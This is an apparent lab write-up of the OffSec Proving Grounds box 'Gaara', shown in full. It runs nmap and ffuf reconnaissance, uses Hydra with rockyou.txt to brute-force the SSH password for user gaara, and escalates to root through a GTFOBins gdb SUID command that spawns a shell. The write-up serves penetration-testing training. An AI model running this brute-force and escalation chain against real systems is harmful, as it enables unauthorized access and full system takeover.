---
title: "Gaara"
description: "OffSec Proving Grounds Gaara — a weak SSH password cracked with Hydra, then a GTFOBins SUID/sudo escape through gdb to a root shell."
tags:
  - Proving Grounds
  - OffSec
  - SSH
  - GTFOBins
  - Easy
---

# Gaara

**Box info:** Difficulty: Easy · OS: Linux (Debian 10) · Focus: SSH password brute-forcing, SUID binary abuse (`gdb`) for privilege escalation.

A minimal attack surface — just SSH and a near-empty web server — means the whole box comes down to credentials. A straightforward Hydra brute-force against SSH gets a shell, and from there a classic GTFOBins trick against `gdb` gets root.

---

## 1. Reconnaissance (nmap)

```bash
sudo nmap -sC -sV -p- --min-rate=1000 -oA nmap/gaara 192.168.210.142
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
```

## 2. Enumeration

Directory fuzzing against the web server turns up nothing but the standard Apache defaults:

```bash
ffuf -u "http://192.168.210.142/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

```text
.htaccess               [Status: 403]
.htpasswd               [Status: 403]
server-status           [Status: 403]
```

With the web app offering nothing further, and the hostname/page title directly naming a user (`gaara`), SSH credential guessing becomes the primary vector.

## 3. Foothold — SSH password brute-force

```bash
hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://192.168.210.142
```

```text
[22][ssh] host: 192.168.210.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
```

```bash
ssh gaara@192.168.210.142
```

```text
gaara@Gaara:~$
```

### User flag

```bash
ls
cat local.txt
```

```text
<LOCAL_REDACTED>
```

## 4. Privilege escalation

SUID binaries run with their owning user's privileges regardless of who invokes them, so they're the first thing checked on a fresh shell:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/umount
```

`/usr/bin/gdb` stands out immediately — a debugger is never meant to carry the SUID bit, since GTFOBins documents it as a direct route to arbitrary code execution as the owning user (root): `gdb` can be told to run a Python command that calls `setuid(0)` and then drops to a shell, all inside the debugger's own process.

```bash
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
```

```text
# whoami
root
```

## 5. Root / proof.txt

```bash
cd /root
ls
cat proof.txt
```

```text
<PROOF_REDACTED>
```

---

## Takeaway

With almost no other attack surface, the entire chain is two textbook mistakes: a weak, dictionary-crackable password on a named SSH account, and SUID left set on `gdb`, a binary whose entire purpose is running arbitrary code with full process control. GTFOBins-style lookups against the SUID binary list should be one of the very first moves on any fresh foothold.
